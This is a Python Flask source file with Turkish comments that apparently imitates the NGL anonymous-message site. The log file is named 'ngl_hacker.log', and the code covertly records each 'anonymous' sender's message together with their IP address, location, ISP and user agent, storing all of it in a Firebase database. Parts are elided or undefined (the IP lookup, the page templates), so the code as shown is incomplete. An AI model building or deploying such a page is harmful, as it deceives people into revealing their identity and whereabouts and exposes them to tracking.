from flask import Flask, request, render_template_string, redirect
import logging
import requests
import os
from datetime import datetime

# Firebase import'ları
import firebase_admin
from firebase_admin import credentials, db
import json

# Logging'i en başa koy (her şey loglansın)
logging.basicConfig(
    level=logging.DEBUG,  # DEBUG yapıyoruz, daha fazla detay çıksın
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)

# Firebase başlatma (en üstte, route'lardan önce)
firebase_initialized = False
try:
    logging.debug("Firebase başlatma denemesi başlıyor...")
    
    if 'GOOGLE_APPLICATION_CREDENTIALS' not in os.environ:
        logging.error("GOOGLE_APPLICATION_CREDENTIALS environment variable YOK!")
        raise ValueError("GOOGLE_APPLICATION_CREDENTIALS variable eksik! Render Environment'a ekle.")
    
    logging.debug("Environment variable bulundu, JSON parse ediliyor...")
    cred_dict = json.loads(os.environ['GOOGLE_APPLICATION_CREDENTIALS'])
    logging.debug("JSON parse başarılı, credential oluşturuluyor...")
    
    cred = credentials.Certificate.from_service_account_info(cred_dict)
    logging.debug("Credential oluşturuldu")
    
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://itiraf-a5d24-default-rtdb.firebaseio.com/'
    })
    firebase_initialized = True
    logging.info("Firebase BAŞARIYLA başlatıldı (Environment Variable'dan)")
except json.JSONDecodeError as je:
    logging.error(f"JSON parse hatası: {str(je)} - Variable içeriğini kontrol et!")
except ValueError as ve:
    logging.error(f"ValueError: {str(ve)}")
except Exception as e:
    logging.error(f"Firebase başlatma HATASI: {str(e)}", exc_info=True)

# Route'lar (değişiklik yok, sadece Firebase push kısmında kontrol ekledik)
@app.route('/', methods=['GET', 'POST'])
def home():
    username = request.args.get('username', '').strip()
    if username:
        return redirect(f"/{username}")
    return render_template_string(HOME_HTML)

@app.route('/<username>', methods=['GET', 'POST'])
def ngl_page(username):
    # ... (IP, konum, isp alma kısmı aynı kalıyor, kısalttım)

    if request.method == 'POST':
        msg = request.form.get('message', '').strip()
        if msg:
            log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
            logging.info(log_entry)
            print(f"[YENİ MESAJ] {log_entry}")

            # Firebase push (sadece başlatıldıysa dene)
            if firebase_initialized:
                try:
                    message_data = {
                        "username": username,
                        "message": msg,
                        "ip": client_ip,
                        "location": location,
                        "isp": isp,
                        "user_agent": user_agent[:150],
                        "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                    }
                    ref = db.reference('/messages')
                    ref.push(message_data)
                    logging.info("[FIREBASE] Mesaj başarıyla kaydedildi")
                    print("[FIREBASE] Mesaj başarıyla kaydedildi")
                except Exception as e:
                    logging.error(f"[FIREBASE PUSH HATASI] {str(e)}")
                    print(f"[FIREBASE PUSH HATASI] {str(e)}")
            else:
                logging.warning("Firebase başlatılmadığı için push yapılmadı!")
                print("Firebase başlatılmadığı için push yapılmadı!")

        return render_template_string(NGL_HTML, username=username, success=True)

    return render_template_string(NGL_HTML, username=username, success=False)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
